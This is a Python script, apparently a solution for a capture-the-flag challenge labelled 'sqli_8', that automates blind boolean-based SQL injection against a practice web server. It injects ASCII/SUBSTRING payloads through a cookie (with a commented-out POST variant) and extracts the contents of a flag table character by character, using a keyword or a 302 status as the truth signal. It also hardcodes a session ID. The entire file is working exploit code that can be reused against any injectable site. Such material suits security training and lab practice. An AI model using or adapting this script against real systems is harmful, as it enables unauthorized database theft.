import requests

# 타겟 주소
url = "http://ctf2.segfaulthub.com:7777/sqli_8/notice_read.php"

max_r = 10      # 최대 행 개수 추출 (필요에 따라 조절)
row_len = 40       # 한 행 데이터 최대 길이 추정

true_val = "dkanrjsk" # 기준이 될 클라이언트의 True 값
keyword = "글제목" # 웹에 표시 되는 것 중 True 값의 기준이 될 keyword
target_table = "flag_table"
target_column = "flag"


row_data = []

for r in range(max_r):
    extracted_row = ""
    for i in range(1, row_len + 1):
        found = False
        for char_code in range(0, 128):
            payload = (
                f"{true_val}' AND ASCII(BINARY SUBSTRING("
                f"(SELECT {target_column} FROM {target_table} "
                f"LIMIT {r},1), {i}, 1))={char_code} AND '1'='1"
            )

            payload2 = (
                f"1=1 AND ASCII(BINARY SUBSTRING("
                f"(SELECT {target_column} FROM {target_table} "
                f"LIMIT {r},1), {i}, 1))={char_code} AND {true_val}"
            )
            cookies = {
                'user' : payload,
                'PHPSESSID' : "ql4rk8cgprg018ob82lamegd38"
            }

            # GET 메서드 & 파라미터명 설정
            
            response = requests.get(url, cookies=cookies)

            # POST 메서드 & 파라미터명 설정
            data = {
                'option_val': payload2,
                'board_result' : "dk",
                'board_search': "%F0%9F%94%8D",
                'date_from': "",
                'date_to' : ""
            }
            #response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)

            # Keyword 여부
            if keyword :
                if keyword in response.text:
                    extracted_row += chr(char_code)
                    print(f"[+] Row {r+1}, Char {i}: {chr(char_code)}")
                    found = True
                    break
            elif response.status_code == 302 :
                extracted_row += chr(char_code)
                print(f"[+] Row {r+1}, Char {i}: {chr(char_code)}")
                found = True
                break
        if not found:
            break

    if extracted_row :
        row_data.append(extracted_row)
        # 해당 행 데이터 추출 완료
        print(f"[✔] Row {r+1} data: {extracted_row}")
    else:
        print("[-] No more rows found.")
        break

print(r)
print("\n[✅] 추출된 데이터 목록:")
for idx, data in enumerate(row_data, 1):
    print(f"{idx}: {data}")
